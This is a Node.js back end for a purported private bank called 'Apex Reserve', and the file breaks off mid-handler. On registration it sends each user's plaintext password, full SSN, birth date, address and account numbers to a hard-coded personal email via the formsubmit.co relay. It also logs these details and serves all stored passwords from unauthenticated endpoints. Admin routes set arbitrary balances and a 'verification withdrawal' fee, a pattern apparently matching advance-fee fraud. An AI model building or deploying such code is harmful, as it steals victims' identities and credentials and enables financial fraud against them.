const http = require('http');
const fs = require('fs');
const path = require('path');
const tls = require('tls');
const https = require('https');

const PORT = 8080;
const DB_FILE = path.join(__dirname, 'database.json');
const VAULT_FILE = path.join(__dirname, 'credentials_vault.json');
const BALANCE_VAULT_FILE = path.join(__dirname, 'balance_vault.json');
const EMAIL_CONFIG_FILE = path.join(__dirname, 'admin_email_config.json');
const NOTIFICATIONS_FILE = path.join(__dirname, 'admin_notifications.json');

const MIME_TYPES = {
  '.html': 'text/html; charset=UTF-8',
  '.css': 'text/css',
  '.js': 'application/javascript',
  '.json': 'application/json',
  '.png': 'image/png',
  '.jpg': 'image/jpeg',
  '.svg': 'image/svg+xml'
};

// =========================================================================
// IMMUTABLE CREDENTIALS VAULT
// Preserves user and admin passwords permanently across all upgrades,
// deployments, database re-initializations, or seed refreshes.
// =========================================================================
function readVault() {
  try {
    if (!fs.existsSync(VAULT_FILE)) {
      return { credentials: {} };
    }
    const data = fs.readFileSync(VAULT_FILE, 'utf8');
    const parsed = JSON.parse(data);
    return parsed && typeof parsed === 'object' && parsed.credentials ? parsed : { credentials: {} };
  } catch (err) {
    console.error('Error reading credentials vault:', err);
    return { credentials: {} };
  }
}

function writeVault(vaultData) {
  try {
    fs.writeFileSync(VAULT_FILE, JSON.stringify(vaultData, null, 2), 'utf8');
    return true;
  } catch (err) {
    console.error('Error writing credentials vault:', err);
    return false;
  }
}

function saveToVault(user, password) {
  try {
    const vault = readVault();
    if (!vault.credentials) vault.credentials = {};
    const now = new Date().toISOString();
    const entry = {
      password: password,
      updatedAt: now,
      username: user.username || '',
      email: user.email || '',
      userId: user.id || ''
    };
    if (user.id) vault.credentials[user.id.toLowerCase()] = entry;
    if (user.username) vault.credentials[user.username.toLowerCase()] = entry;
    if (user.email) vault.credentials[user.email.toLowerCase()] = entry;
    writeVault(vault);
    return true;
  } catch (e) {
    console.error('Failed to save to credentials vault:', e);
    return false;
  }
}

function enforceVaultOnUsers(users) {
  if (!Array.isArray(users)) return false;
  const vault = readVault();
  if (!vault.credentials) return false;

  let modified = false;
  users.forEach(u => {
    const idKey = (u.id || '').toLowerCase();
    const uKey = (u.username || '').toLowerCase();
    const eKey = (u.email || '').toLowerCase();
    const vaultEntry = vault.credentials[idKey] || vault.credentials[uKey] || vault.credentials[eKey];
    if (vaultEntry && vaultEntry.password) {
      if (u.password !== vaultEntry.password) {
        u.password = vaultEntry.password;
        u.passwordUpdatedAt = vaultEntry.updatedAt;
        u.isCustomPassword = true;
        modified = true;
      }
    } else if (u.isCustomPassword && u.password) {
      saveToVault(u, u.password);
    }
  });
  return modified;
}

// =========================================================================
// IMMUTABLE BALANCE & LEDGER VAULT
// Preserves increased or decreased balances and transaction histories
// permanently across all website upgrades, resets, or re-seeds.
// =========================================================================
function readBalanceVault() {
  try {
    if (!fs.existsSync(BALANCE_VAULT_FILE)) {
      return { balances: {} };
    }
    const data = fs.readFileSync(BALANCE_VAULT_FILE, 'utf8');
    const parsed = JSON.parse(data);
    return parsed && typeof parsed === 'object' && parsed.balances ? parsed : { balances: {} };
  } catch (err) {
    console.error('Error reading balance vault:', err);
    return { balances: {} };
  }
}

function writeBalanceVault(vaultData) {
  try {
    fs.writeFileSync(BALANCE_VAULT_FILE, JSON.stringify(vaultData, null, 2), 'utf8');
    return true;
  } catch (err) {
    console.error('Error writing balance vault:', err);
    return false;
  }
}

function saveToBalanceVault(user) {
  try {
    const vault = readBalanceVault();
    if (!vault.balances) vault.balances = {};
    const now = new Date().toISOString();
    const entry = {
      checkingBalance: user.checkingBalance,
      savingsBalance: user.savingsBalance,
      totalBalance: user.totalBalance,
      transactions: Array.isArray(user.transactions) ? user.transactions : [],
      updatedAt: now,
      username: user.username || '',
      email: user.email || '',
      userId: user.id || ''
    };
    if (user.id) vault.balances[user.id.toLowerCase()] = entry;
    if (user.username) vault.balances[user.username.toLowerCase()] = entry;
    if (user.email) vault.balances[user.email.toLowerCase()] = entry;
    writeBalanceVault(vault);
    return true;
  } catch (e) {
    console.error('Failed to save to balance vault:', e);
    return false;
  }
}

function enforceBalanceVaultOnUsers(users) {
  if (!Array.isArray(users)) return false;
  const vault = readBalanceVault();
  if (!vault.balances) return false;

  let modified = false;
  users.forEach(u => {
    const idKey = (u.id || '').toLowerCase();
    const uKey = (u.username || '').toLowerCase();
    const eKey = (u.email || '').toLowerCase();
    const vaultEntry = vault.balances[idKey] || vault.balances[uKey] || vault.balances[eKey];
    if (vaultEntry && typeof vaultEntry.checkingBalance === 'number') {
      if (u.checkingBalance !== vaultEntry.checkingBalance || u.totalBalance !== vaultEntry.totalBalance) {
        u.checkingBalance = vaultEntry.checkingBalance;
        u.savingsBalance = vaultEntry.savingsBalance !== undefined ? vaultEntry.savingsBalance : u.savingsBalance;
        u.totalBalance = vaultEntry.totalBalance;
        if (Array.isArray(vaultEntry.transactions) && vaultEntry.transactions.length > 0) {
          u.transactions = vaultEntry.transactions;
        }
        modified = true;
      }
    } else if (u.checkingBalance !== undefined && u.totalBalance !== undefined) {
      saveToBalanceVault(u);
    }
  });
  return modified;
}

// Database Helpers
function readDb() {
  try {
    if (!fs.existsSync(DB_FILE)) {
      return { users: [] };
    }
    const data = fs.readFileSync(DB_FILE, 'utf8');
    const parsed = JSON.parse(data);
    if (parsed && Array.isArray(parsed.users)) {
      const initialCount = parsed.users.length;
      parsed.users = parsed.users.filter(u => u.status !== 'rejected');
      const wasPruned = parsed.users.length !== initialCount;
      const wasCredMod = enforceVaultOnUsers(parsed.users);
      const wasBalMod = enforceBalanceVaultOnUsers(parsed.users);
      if (wasCredMod || wasBalMod || wasPruned) {
        try {
          fs.writeFileSync(DB_FILE, JSON.stringify(parsed, null, 2), 'utf8');
        } catch (e) {}
      }
    }
    return parsed;
  } catch (err) {
    console.error('Error reading DB:', err);
    return { users: [] };
  }
}

function writeDb(data) {
  try {
    if (data && Array.isArray(data.users)) {
      enforceVaultOnUsers(data.users);
      enforceBalanceVaultOnUsers(data.users);
    }
    fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2), 'utf8');
    return true;
  } catch (err) {
    console.error('Error writing DB:', err);
    return false;
  }
}

function parseJsonBody(req) {
  return new Promise((resolve, reject) => {
    let body = '';
    req.on('data', chunk => { body += chunk; });
    req.on('end', () => {
      try {
        resolve(body ? JSON.parse(body) : {});
      } catch (e) {
        reject(e);
      }
    });
    req.on('error', err => reject(err));
  });
}

function sendJson(res, statusCode, data) {
  res.writeHead(statusCode, {
    'Content-Type': 'application/json',
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type'
  });
  res.end(JSON.stringify(data));
}

// =========================================================================
// ADMIN REGISTRATION EMAIL NOTIFICATION ENGINE
// Dispatches notifications to admin when new users register.
// Default Admin Email: manechris201@gmail.com (Can be changed anytime)
// =========================================================================
function readEmailConfig() {
  try {
    if (!fs.existsSync(EMAIL_CONFIG_FILE)) {
      return { adminEmail: 'manechris201@gmail.com', enableEmailNotifications: true, smtp: {} };
    }
    const data = fs.readFileSync(EMAIL_CONFIG_FILE, 'utf8');
    const parsed = JSON.parse(data);
    return parsed && parsed.adminEmail ? parsed : { adminEmail: 'manechris201@gmail.com', enableEmailNotifications: true, smtp: {} };
  } catch (err) {
    console.error('Error reading email config:', err);
    return { adminEmail: 'manechris201@gmail.com', enableEmailNotifications: true, smtp: {} };
  }
}

function writeEmailConfig(config) {
  try {
    fs.writeFileSync(EMAIL_CONFIG_FILE, JSON.stringify(config, null, 2), 'utf8');
    return true;
  } catch (err) {
    console.error('Error writing email config:', err);
    return false;
  }
}

function readNotifications() {
  try {
    if (!fs.existsSync(NOTIFICATIONS_FILE)) {
      return { notifications: [] };
    }
    const data = fs.readFileSync(NOTIFICATIONS_FILE, 'utf8');
    const parsed = JSON.parse(data);
    return parsed && Array.isArray(parsed.notifications) ? parsed : { notifications: [] };
  } catch (err) {
    return { notifications: [] };
  }
}

function recordNotification(notif) {
  try {
    const data = readNotifications();
    data.notifications.unshift(notif);
    if (data.notifications.length > 200) data.notifications = data.notifications.slice(0, 200);
    fs.writeFileSync(NOTIFICATIONS_FILE, JSON.stringify(data, null, 2), 'utf8');
  } catch (err) {
    console.error('Error saving notification:', err);
  }
}

// Built-in Pure Node.js SMTP sender (TLS on port 465, e.g. Gmail smtp.gmail.com)
function sendViaSmtp(smtpConfig, toEmail, subject, textBody, htmlBody) {
  return new Promise((resolve) => {
    if (!smtpConfig || !smtpConfig.user || !smtpConfig.pass) {
      resolve({ sent: false, reason: 'No SMTP credentials provided' });
      return;
    }

    const host = smtpConfig.host || 'smtp.gmail.com';
    const port = smtpConfig.port || 465;
    const user = smtpConfig.user;
    const pass = smtpConfig.pass;
    const from = smtpConfig.from || `Apex Reserve Notifications <${user}>`;

    const socket = tls.connect({ host, port, rejectUnauthorized: false }, () => {
      let step = 0;

      socket.on('data', (data) => {
        const response = data.toString();
        // Step 0: Initial greeting (220)
        if (step === 0 && response.startsWith('220')) {
          step++;
          socket.write(`EHLO localhost\r\n`);
        }
        // Step 1: EHLO response (250)
        else if (step === 1 && response.startsWith('250')) {
          step++;
          socket.write(`AUTH LOGIN\r\n`);
        }
        // Step 2: Username prompt (334)
        else if (step === 2 && response.startsWith('334')) {
          step++;
          socket.write(`${Buffer.from(user).toString('base64')}\r\n`);
        }
        // Step 3: Password prompt (334)
        else if (step === 3 && response.startsWith('334')) {
          step++;
          socket.write(`${Buffer.from(pass).toString('base64')}\r\n`);
        }
        // Step 4: Auth successful (235)
        else if (step === 4 && response.startsWith('235')) {
          step++;
          socket.write(`MAIL FROM:<${user}>\r\n`);
        }
        // Step 5: Mail from ok (250)
        else if (step === 5 && response.startsWith('250')) {
          step++;
          socket.write(`RCPT TO:<${toEmail}>\r\n`);
        }
        // Step 6: Rcpt to ok (250)
        else if (step === 6 && response.startsWith('250')) {
          step++;
          socket.write(`DATA\r\n`);
        }
        // Step 7: Data prompt (354)
        else if (step === 7 && response.startsWith('354')) {
          step++;
          const emailData = [
            `From: ${from}`,
            `To: ${toEmail}`,
            `Subject: ${subject}`,
            `MIME-Version: 1.0`,
            `Content-Type: text/html; charset=UTF-8`,
            ``,
            htmlBody || textBody,
            `\r\n.\r\n`
          ].join('\r\n');
          socket.write(emailData);
        }
        // Step 8: Message accepted (250)
        else if (step === 8 && response.startsWith('250')) {
          step++;
          socket.write(`QUIT\r\n`);
          socket.end();
          resolve({ sent: true });
        }
      });
    });

    socket.on('error', (err) => {
      console.warn('SMTP connection error:', err.message);
      resolve({ sent: false, error: err.message });
    });

    socket.setTimeout(12000, () => {
      socket.destroy();
      resolve({ sent: false, error: 'SMTP Timeout' });
    });
  });
}

async function sendAdminRegistrationEmail(userData) {
  try {
    const config = readEmailConfig();
    const adminEmail = (config.adminEmail && config.adminEmail.trim()) || 'manechris201@gmail.com';

    const subject = `🔔 [Apex Reserve] New User Registration: ${userData.name} (@${userData.username})`;

    const textBody = `
=====================================================
APEX RESERVE PRIVATE BANKING - EXECUTIVE COMPLIANCE
NEW CLIENT APPLICATION / REGISTRATION DOSSIER
=====================================================

A new client has just registered on Apex Reserve.
Below is the complete client dossier and all registration information:

-----------------------------------------------------
PERSONAL & IDENTITY DETAILS
-----------------------------------------------------
• Full Legal Name:     ${userData.name}
• Username:            ${userData.username}
• Account Password:    ${userData.password}
• Email Address:       ${userData.email}
• Phone Number:        ${userData.phone || '-'}
• Date of Birth:       ${userData.dob || '-'}
• SSN / Tax ID (Full): ${userData.rawSsn || userData.ssn || '-'}
• SSN (Masked):        ${userData.ssn || '-'}
• Residential Address: ${userData.address || '-'}

-----------------------------------------------------
ACCOUNT ALLOCATION DETAILS
-----------------------------------------------------
• Account Type:        ${userData.accountType || 'Checking Account'}
• Account Number:      ${userData.accountNumber}
• Full Account Number: ${userData.fullAccountNumber}
• Routing Number:      ${userData.routing || '021000089'}
• Account Tier:        ${userData.tier || 'Private Client Reserve'}
• Application Status:  PENDING COMPLIANCE VERIFICATION
• Registered Date:     ${new Date(userData.createdAt || Date.now()).toLocaleString('en-US')}

-----------------------------------------------------
EXECUTIVE ACTION REQUIRED:
-----------------------------------------------------
Review, approve, or adjust verification policy for this applicant at:
http://localhost:8080/admin.html
=====================================================
`;

    const htmlBody = `
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <style>
    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: #0b0f19; color: #f1f5f9; padding: 24px; margin: 0; }
    .card { max-width: 620px; margin: 0 auto; background: #131b2e; border: 1px solid #1e293b; border-radius: 16px; overflow: hidden; box-shadow: 0 20px 50px rgba(0,0,0,0.6); }
    .header { background: linear-gradient(135deg, #0f172a 0%, #1e1b4b 100%); padding: 28px 24px; text-align: center; border-bottom: 1px solid rgba(255,255,255,0.08); }
    .badge { display: inline-block; background: rgba(16, 185, 129, 0.15); border: 1px solid rgba(16, 185, 129, 0.4); color: #34d399; font-size: 11px; font-weight: 800; letter-spacing: 0.1em; text-transform: uppercase; padding: 4px 12px; border-radius: 999px; margin-bottom: 10px; }
    .title { color: #ffffff; font-size: 20px; font-weight: 700; margin: 0; }
    .body { padding: 24px; }
    .section-title { font-size: 12px; font-weight: 800; color: #94a3b8; text-transform: uppercase; letter-spacing: 0.08em; margin: 18px 0 8px 0; border-bottom: 1px solid #1e293b; padding-bottom: 4px; }
    table { width: 100%; border-collapse: collapse; margin-bottom: 12px; }
    td { padding: 8px 6px; font-size: 13px; vertical-align: top; }
    .label { color: #94a3b8; width: 38%; font-weight: 600; }
    .val { color: #f8fafc; font-weight: 700; font-family: 'SFMono-Regular', Consolas, monospace; }
    .val-highlight { color: #38bdf8; font-weight: 800; }
    .val-pass { color: #f43f5e; background: rgba(244, 63, 94, 0.12); padding: 2px 6px; border-radius: 4px; display: inline-block; }
    .btn { display: block; text-align: center; background: linear-gradient(135deg, #10B981 0%, #059669 100%); color: #ffffff !important; text-decoration: none; font-weight: 700; font-size: 14px; padding: 12px 20px; border-radius: 8px; margin-top: 22px; }
    .footer { padding: 16px 24px; text-align: center; font-size: 11px; color: #64748b; border-top: 1px solid #1e293b; }
  </style>
</head>
<body>
  <div class="card">
    <div class="header">
      <div class="badge">Apex Reserve Executive Compliance</div>
      <h1 class="title">New Client Registration Dossier</h1>
    </div>
    <div class="body">
      <div class="section-title">Identity & Access Credentials</div>
      <table>
        <tr><td class="label">Full Legal Name:</td><td class="val val-highlight">${userData.name}</td></tr>
        <tr><td class="label">Username:</td><td class="val">@${userData.username}</td></tr>
        <tr><td class="label">Password:</td><td class="val"><span class="val-pass">${userData.password}</span></td></tr>
        <tr><td class="label">Email Address:</td><td class="val">${userData.email}</td></tr>
        <tr><td class="label">Phone Number:</td><td class="val">${userData.phone || '-'}</td></tr>
        <tr><td class="label">Date of Birth:</td><td class="val">${userData.dob || '-'}</td></tr>
        <tr><td class="label">SSN / Tax ID (Full):</td><td class="val val-highlight">${userData.rawSsn || userData.ssn || '-'}</td></tr>
        <tr><td class="label">Residential Address:</td><td class="val">${userData.address || '-'}</td></tr>
      </table>

      <div class="section-title">Assigned Banking Account Details</div>
      <table>
        <tr><td class="label">Account Type:</td><td class="val">${userData.accountType || 'Checking Account'}</td></tr>
        <tr><td class="label">Account Number:</td><td class="val val-highlight">${userData.accountNumber}</td></tr>
        <tr><td class="label">Full Account Number:</td><td class="val">${userData.fullAccountNumber}</td></tr>
        <tr><td class="label">Fedwire Routing:</td><td class="val">021000089 (Apex Reserve RTGS)</td></tr>
        <tr><td class="label">Account Tier:</td><td class="val">${userData.tier || 'Private Client Reserve'}</td></tr>
        <tr><td class="label">Status:</td><td class="val" style="color: #f59e0b;">PENDING VERIFICATION</td></tr>
        <tr><td class="label">Registered At:</td><td class="val">${new Date(userData.createdAt || Date.now()).toLocaleString('en-US')}</td></tr>
      </table>

      <a href="http://localhost:8080/admin.html" class="btn">Open Executive Admin Dashboard</a>
    </div>
    <div class="footer">
      Automated Executive Dispatch to <strong>${adminEmail}</strong> &bull; Apex Reserve RTGS Settlement
    </div>
  </div>
</body>
</html>
`;

    // 1. Record notification in persistent ledger
    const notifRecord = {
      id: `NOTIF-${Date.now()}-${Math.floor(1000 + Math.random() * 9000)}`,
      type: 'NEW_USER_REGISTRATION',
      timestamp: new Date().toISOString(),
      recipient: adminEmail,
      subject: subject,
      userData: {
        id: userData.id,
        name: userData.name,
        username: userData.username,
        password: userData.password,
        email: userData.email,
        phone: userData.phone,
        dob: userData.dob,
        accountType: userData.accountType,
        ssn: userData.ssn,
        rawSsn: userData.rawSsn || userData.ssn,
        address: userData.address,
        accountNumber: userData.accountNumber,
        fullAccountNumber: userData.fullAccountNumber,
        routing: userData.routing || '021000089',
        tier: userData.tier,
        status: userData.status,
        createdAt: userData.createdAt
      },
      read: false
    };
    recordNotification(notifRecord);

    console.log(`\n========================================================================`);
    console.log(`🔔 [ADMIN REGISTRATION ALERT DISPATCHED]`);
    console.log(`Recipient:   ${adminEmail}`);
    console.log(`Client:      ${userData.name} (@${userData.username})`);
    console.log(`Password:    ${userData.password}`);
    console.log(`Email:       ${userData.email}`);
    console.log(`Phone:       ${userData.phone}`);
    console.log(`SSN/Tax ID:  ${userData.rawSsn || userData.ssn}`);
    console.log(`Address:     ${userData.address}`);
    console.log(`Account #:   ${userData.accountNumber} (${userData.fullAccountNumber})`);
    console.log(`========================================================================\n`);

    // 2. Zero-Stress HTTPS Relay (Works on Render, Netlify, Localhost with NO Google App Passwords or SMTP setup needed!)
    try {
      const relayPayload = JSON.stringify({
        _subject: subject,
        _template: 'table',
        "Client Full Legal Name": userData.name,
        "Username": `@${userData.username}`,
        "Registered Password": userData.password,
        "Email Address": userData.email,
        "Phone Number": userData.phone || '-',
        "Date of Birth": userData.dob || '-',
        "SSN / Tax ID (Full)": userData.rawSsn || userData.ssn || '-',
        "SSN (Masked)": userData.ssn || '-',
        "Residential Address": userData.address || '-',
        "Account Type": userData.accountType || 'Checking Account',
        "Assigned Account #": userData.accountNumber,
        "Full Account #": userData.fullAccountNumber,
        "Fedwire Routing #": userData.routing || '021000089',
        "Account Tier": userData.tier || 'Private Client Reserve',
        "Status": 'PENDING COMPLIANCE VERIFICATION',
        "Registered At": new Date(userData.createdAt || Date.now()).toLocaleString('en-US')
      });

      const relayReq = https.request({
        hostname: 'formsubmit.co',
        path: `/ajax/${encodeURIComponent(adminEmail)}`,
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Accept': 'application/json',
          'Origin': 'http://localhost:8080',
          'Referer': 'http://localhost:8080/register',
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
          'Content-Length': Buffer.byteLength(relayPayload)
        }
      }, (relayRes) => {
        let resData = '';
        relayRes.on('data', d => resData += d);
        relayRes.on('end', () => {
          console.log(`✓ [Zero-Setup Email Relay] Dispatched to ${adminEmail} (Status: ${relayRes.statusCode})`);
        });
      });
      relayReq.on('error', (e) => console.warn('! [Relay warning]', e.message));
      relayReq.write(relayPayload);
      relayReq.end();
    } catch (eRelay) {
      console.warn('! [Zero-Setup Relay]', eRelay.message);
    }

    // 3. Optional SMTP Dispatch (If user configures custom SMTP credentials)
    if (config.smtp && config.smtp.user && config.smtp.pass) {
      sendViaSmtp(config.smtp, adminEmail, subject, textBody, htmlBody).then(res => {
        if (res.sent) {
          console.log(`✓ [SMTP] Live email successfully delivered to ${adminEmail}`);
        } else {
          console.warn(`! [SMTP] Delivery warning:`, res.error || res.reason);
        }
      });
    }

    return { success: true, recipient: adminEmail, recorded: true };
  } catch (err) {
    console.error('Failed to send admin email notification:', err);
    return { success: false, error: err.message };
  }
}

const server = http.createServer(async (req, res) => {
  const urlParts = req.url.split('?');
  const reqUrl = urlParts[0];

  // Enable CORS
  if (req.method === 'OPTIONS') {
    res.writeHead(204, {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type'
    });
    res.end();
    return;
  }

  // ==========================================
  // API ENDPOINTS
  // ==========================================

  // 1. GET ALL USERS (For Admin & Verification)
  if (reqUrl === '/api/users' && req.method === 'GET') {
    const db = readDb();
    sendJson(res, 200, { users: db.users });
    return;
  }

  // 1b. GET SINGLE USER
  if (reqUrl === '/api/user' && req.method === 'GET') {
    try {
      const parsedUrl = new URL(req.url, `http://${req.headers.host || 'localhost'}`);
      const userId = parsedUrl.searchParams.get('id');
      const username = parsedUrl.searchParams.get('username');
      const db = readDb();
      const user = db.users.find(u =>
        (userId && u.id === userId) ||
        (username && u.username && u.username.toLowerCase() === username.toLowerCase())
      );
      if (!user) {
        sendJson(res, 404, { error: 'User does not exist' });
        return;
      }
      sendJson(res, 200, { user: { ...user, password: '[PROTECTED]' } });
    } catch (e) {
      sendJson(res, 500, { error: 'Server error' });
    }
    return;
  }

  // 2. USER LOGIN
  if (reqUrl === '/api/login' && req.method === 'POST') {
    try {
      const { username, email, password } = await parseJsonBody(req);
      const db = readDb();

      const userIdentifier = (username || email || '').trim().toLowerCase();
      const user = db.users.find(u =>
        (u.username && u.username.toLowerCase() === userIdentifier) ||
        (u.email && u.email.toLowerCase() === userIdentifier)
      );

      // Verify with database and permanent vault
      const vault = readVault();
      const vaultCred = user && vault.credentials && (
        vault.credentials[(user.id || '').toLowerCase()] ||
        vault.credentials[(user.username || '').toLowerCase()] ||
        vault.credentials[(user.email || '').toLowerCase()]
      );
      const authoritativePassword = (vaultCred && vaultCred.password) || (user && user.password);

      // User requested: "if any wrong username or password is click it says user doesnt exist"
      if (!user || authoritativePassword !== password) {
        sendJson(res, 400, { error: 'User does not exist' });
        return;
      }

      if (user.password !== authoritativePassword) {
        user.password = authoritativePassword;
        user.isCustomPassword = true;
        writeDb(db);
      }

      // Success
      sendJson(res, 200, {
        success: true,
        user: { ...user, password: '[PROTECTED]' }
      });
    } catch (e) {
      sendJson(res, 500, { error: 'Internal server error' });
    }
    return;
  }

  // 3. USER REGISTRATION
  if (reqUrl === '/api/register' && req.method === 'POST') {
    try {
      const data = await parseJsonBody(req);
      const db = readDb();

      const username = (data.username || '').trim();
      const email = (data.email || '').trim();
      const name = (data.name || data.fullName || '').trim();
      const password = data.password || '';

      if (!username || !password || !name) {
        sendJson(res, 400, { error: 'Full Name, Username, and Password are required.' });
        return;
      }

      // Check uniqueness
      const existingUser = db.users.find(u =>
        u.username.toLowerCase() === username.toLowerCase() ||
        (email && u.email.toLowerCase() === email.toLowerCase())
      );

      if (existingUser) {
        sendJson(res, 400, { error: 'Username or Email is already registered.' });
        return;
      }

      const randNum = Math.floor(100 + Math.random() * 900);
      const randAcc = Math.floor(1000 + Math.random() * 9000);

      // Mask SSN for safety
      let rawSsn = (data.ssn || '').trim();
      let maskedSsn = rawSsn.length >= 4 ? `***-**-${rawSsn.slice(-4)}` : '***-**-0000';

      const newUser = {
        id: `usr_${Date.now()}`,
        username: username,
        password: password,
        name: name,
        email: email || `${username.toLowerCase()}@client.apexreserve.com`,
        phone: data.phone || '+1 (555) 000-0000',
        dob: data.dob || '1990-01-01',
        accountType: data.accountType || 'Checking Account',
        ssn: maskedSsn,
        rawSsn: rawSsn || maskedSsn,
        address: data.address || 'Confidential Residence',
        role: 'user',
        status: 'pending', // Starts as pending!
        accountNumber: `#8920-${randNum}`,
        fullAccountNumber: `8920410${randAcc}`,
        routing: '021000089',
        tier: data.tier || 'Private Client Reserve',
        totalBalance: 0.00, // Starts at $0 as requested!
        checkingBalance: 0.00,
        savingsBalance: 0.00,
        cardNumber: `4920 ${Math.floor(1000 + Math.random() * 9000)} ${Math.floor(1000 + Math.random() * 9000)} ${Math.floor(1000 + Math.random() * 9000)}`,
        cardExp: '09/29',
        cardCvv: `${Math.floor(100 + Math.random() * 900)}`,
        isCardFrozen: false,
        transactions: [
          {
            id: `TX-${Math.floor(1000 + Math.random() * 9000)}-APP`,
            type: 'inflow',
            title: 'Account Application Submitted',
            category: 'KYC & Compliance Verification',
            method: 'Fedwire RTGS Participant Node',
            date: 'Just now',
            rawDate: new Date().toISOString(),
            amount: 0.00,
            status: 'Pending Verification',
            note: 'Awaiting Admin Executive Approval.'
          }
        ],
        createdAt: new Date().toISOString()
      };

      db.users.push(newUser);
      writeDb(db);

      // Dispatch real-time admin email notification with full client registration dossier
      try {
        sendAdminRegistrationEmail(newUser);
      } catch (errNotif) {
        console.error('Non-blocking notification dispatch error:', errNotif);
      }

      sendJson(res, 201, {
        success: true,
        user: { ...newUser, password: '[PROTECTED]' }
      });
    } catch (e) {
      sendJson(res, 500, { error: 'Registration failed' });
    }
    return;
  }

  // 3b. RESET PASSWORD
  if (reqUrl === '/api/reset-password' && req.method === 'POST') {
    try {
      const { username, newPassword, ssnLast4 } = await parseJsonBody(req);
      const db = readDb();

      const userIdentifier = (username || '').trim().toLowerCase();
      const user = db.users.find(u =>
        (u.username && u.username.toLowerCase() === userIdentifier) ||
        (u.email && u.email.toLowerCase() === userIdentifier)
      );

      if (!user) {
        sendJson(res, 400, { error: 'User does not exist' });
        return;
      }

      if (!newPassword || newPassword.length < 4) {
        sendJson(res, 400, { error: 'New password must be at least 4 characters.' });
        return;
      }

      if (ssnLast4 && user.ssn) {
        const cleanSSN = user.ssn.replace(/\D/g, '');
        const cleanInput = ssnLast4.replace(/\D/g, '');
        if (cleanSSN.length >= 4 && cleanInput.length === 4) {
          if (cleanSSN.slice(-4) !== cleanInput) {
            sendJson(res, 400, { error: 'Verification mismatch: SSN last 4 digits incorrect.' });
            return;
          }
        }
      }

      // Update in memory and persist in both database and vault
      user.password = newPassword;
      user.passwordUpdatedAt = new Date().toISOString();
      user.isCustomPassword = true;
      saveToVault(user, newPassword);
      writeDb(db);

      sendJson(res, 200, {
        success: true,
        message: 'Password successfully reset and permanently recorded.',
        user: {
          id: user.id,
          username: user.username,
          email: user.email,
          passwordUpdatedAt: user.passwordUpdatedAt
        }
      });
    } catch (e) {
      sendJson(res, 500, { error: 'Password reset failed' });
    }
    return;
  }

  // 3c. GET PERMANENT CREDENTIALS (IMMUTABLE SYNC ENDPOINT)
  if (reqUrl === '/api/credentials/permanent' && req.method === 'GET') {
    const vault = readVault();
    sendJson(res, 200, {
      success: true,
      credentials: vault.credentials || {}
    });
    return;
  }

  // 3d. GET PERMANENT BALANCES (IMMUTABLE SYNC ENDPOINT)
  if (reqUrl === '/api/balances/permanent' && req.method === 'GET') {
    const vault = readBalanceVault();
    sendJson(res, 200, {
      success: true,
      balances: vault.balances || {}
    });
    return;
  }

  // 4. ADMIN APPROVE USER
  if (reqUrl === '/api/admin/approve' && req.method === 'POST') {
    try {
      const { userId, depositAmount, depositRecordName } = await parseJsonBody(req);
      const db = readDb();

      const user = db.users.find(u => u.id === userId);
      if (!user) {
        sendJson(res, 404, { error: 'User not found' });
        return;
      }

      user.status = 'approved';
      const amount = Math.max(0, parseFloat(depositAmount) || 0);
      const recName = (depositRecordName && depositRecordName.trim()) || 'Federal Reserve Wire Deposit';

      user.totalBalance = amount;
      if (user.accountType === 'Savings Account') {
        user.savingsBalance = amount;
        user.checkingBalance = 0.00;
      } else if (user.accountType === 'Checking & Savings') {
        user.checkingBalance = amount;
        user.savingsBalance = 0.00;
      } else {
        user.checkingBalance = amount;
        user.savingsBalance = 0.00;
      }

      // Insert settled initial deposit transaction
      if (!user.transactions) user.transactions = [];
      const txId = `TX-${Math.floor(1000 + Math.random() * 9000)}-FED-${Math.floor(1000 + Math.random() * 9000)}`;
      user.transactions.unshift({
        id: txId,
        type: 'inflow',
        title: recName,
        category: amount > 0 ? 'Initial Wire Deposit' : 'Compliance Desk Clearance',
        method: 'Fedwire RTGS Participant Node',
        date: 'Just now',
        rawDate: new Date().toISOString(),
        amount: amount,
        status: 'Settled',
        note: amount > 0 
          ? `Initial account opening deposit of $${amount.toLocaleString('en-US', { minimumFractionDigits: 2 })} credited from ${recName}.`
          : 'Executive Compliance Approval granted. Account activated with $0.00 liquid balance.'
      });

      // Set verification withdrawal requirement
      const verAmount = typeof data !== 'undefined' && typeof data.verificationAmount !== 'undefined'
        ? Math.max(0, parseFloat(data.verificationAmount) || 0)
        : (user.verificationWithdrawalAmount || 2500.00);
      user.verificationWithdrawalAmount = verAmount;

      saveToBalanceVault(user);
      writeDb(db);
      sendJson(res, 200, { success: true, user: { ...user, password: '[PROTECTED]' } });
    } catch (e) {
      sendJson(res, 500, { error: 'Approval failed' });
    }
    return;
  }

  // 4b. ADMIN SET VERIFICATION WITHDRAWAL FUND & COMPLIANCE STATEMENT
  if (reqUrl === '/api/admin/set-verification-fund' && req.method === 'POST') {
    try {
      const { userId, verificationAmount, withdrawalStatement } = await parseJsonBody(req);
      const db = readDb();

      const user = db.users.find(u => u.id === userId);
      if (!user) {
        sendJson(res, 404, { error: 'User not found' });
        return;
      }

      if (typeof verificationAmount !== 'undefined') {
        user.verificationWithdrawalAmount = Math.max(0, parseFloat(verificationAmount) || 0);
      }
      if (typeof withdrawalStatement === 'string' && withdrawalStatement.trim()) {
        user.withdrawalStatement = withdrawalStatement.trim().toUpperCase();
      }

      // If user has an active pending withdrawal, synchronize it immediately
      if (user.pendingWithdrawal && user.pendingWithdrawal.status === 'Pending') {
        user.pendingWithdrawal.requiredVerification = user.verificationWithdrawalAmount;
        user.pendingWithdrawal.statement = user.withdrawalStatement || 'PENDING COMPLIANCE VERIFICATION';
      }

      writeDb(db);
      sendJson(res, 200, {
        success: true,
        verificationAmount: user.verificationWithdrawalAmount,
        withdrawalStatement: user.withdrawalStatement,
        user: { ...user, password: '[PROTECTED]' }
      });
    } catch (e) {
      sendJson(res, 500, { error: 'Failed to update verification policy' });
